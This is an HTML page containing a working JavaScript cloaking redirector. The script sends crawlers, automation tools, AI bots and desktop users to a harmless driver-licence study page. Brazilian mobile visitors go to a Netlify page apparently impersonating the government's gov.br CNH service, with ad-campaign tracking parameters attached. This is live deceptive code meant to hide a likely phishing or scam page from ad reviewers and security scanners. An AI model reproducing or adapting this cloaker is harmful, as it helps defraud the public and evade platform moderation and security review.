<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Carregando...</title>
<style>body{background:#fff;margin:0;padding:0;}</style>
</head>
<body>
<script>
(function(){
  var WHITE = "https://simuladodetranbrasil.com.br/apostilas-cnh-detran/";
  var BLACK = "https://novacnh-brasil-gov-br.netlify.app/";

  // Bot User-Agents conhecidos incluindo crawlers do Facebook/Meta
  var BOT_UA = [
    "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
    "linkedinbot","twitterbot","applebot","googlebot","bingbot","slurp",
    "duckduckbot","baiduspider","yandexbot","sogou","exabot","ia_archiver",
    "mj12bot","ahrefsbot","semrushbot","dotbot","rogerbot","pinterestbot",
    "petalbot","bytespider","gptbot","chatgpt","claudebot","anthropic",
    "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
    "python-requests","python-urllib","java/","curl/","wget/","libwww",
    "scrapy","httpclient","okhttp","axios","node-fetch","postman",
    "netsystemsresearch","dataforseo","archive.org","commoncrawl"
  ];

  function isBot() {
    var ua = (navigator.userAgent || "").toLowerCase();
    for (var i = 0; i < BOT_UA.length; i++) {
      if (ua.indexOf(BOT_UA[i]) !== -1) return true;
    }
    // Detecta automação
    if (navigator.webdriver) return true;
    if (window._phantom || window.callPhantom) return true;
    if (window.__nightmare) return true;
    if (document.documentElement.getAttribute("webdriver")) return true;
    return false;
  }

  function isMobile() {
    return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
  }

  function appendUtms(url) {
    var params = new URLSearchParams(window.location.search);
    var utmKeys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
    var destParams = new URLSearchParams();
    utmKeys.forEach(function(k) {
      var v = params.get(k);
      if (v) destParams.set(k, v);
    });
    var qs = destParams.toString();
    if (!qs) return url;
    return url + (url.indexOf("?") === -1 ? "?" : "&") + qs;
  }

  function goTo(url) {
    window.location.replace(url);
  }

  // 1. Bot detectado → white
  if (isBot()) {
    goTo(WHITE);
    return;
  }

  // 2. Desktop → white
  if (!isMobile()) {
    goTo(WHITE);
    return;
  }

  // 3. Mobile → verifica país via API
  fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) })
    .then(function(r){ return r.json(); })
    .then(function(data){
      var country = (data.country_code || "").toUpperCase();
      if (country === "BR") {
        goTo(appendUtms(BLACK));
      } else {
        goTo(WHITE);
      }
    })
    .catch(function(){
      // Se falhar a verificação de IP, deixa passar (mobile já validado)
      goTo(appendUtms(BLACK));
    });

})();
</script>
</body>
</html>
